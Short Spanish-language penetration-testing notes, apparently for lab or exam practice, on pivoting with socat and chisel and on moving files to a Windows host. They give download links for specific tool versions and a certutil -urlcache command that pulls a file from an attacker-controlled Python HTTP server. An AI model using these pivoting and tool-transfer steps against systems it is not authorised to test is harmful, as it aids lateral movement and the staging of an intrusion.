Para el pivoting usaremos versiones mas antiguas de socat y chisel
- SOCAT -> Linux: https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
		- > Windows: https://deephacking.tech/pivoting-con-socat/
- CHISEL -> https://github.com/jpillora/chisel/releases/tag/v1.7.5 hay que usar la correspondiente en el cliente Windows y Linux 386 y en el servidor Windows 386 o Linux amd 64



Compartirse archivos por red
Al querer enviarlo a un maquina Windows lo haremos de la siguiente manera

- En la maquina Linux -> `python3 -m http.server <puerto>`
- En la maquina Windows -> `certutil -split -urlcache -f http://<IP>:<puerto>/<archivo> <nombre_archivo_e`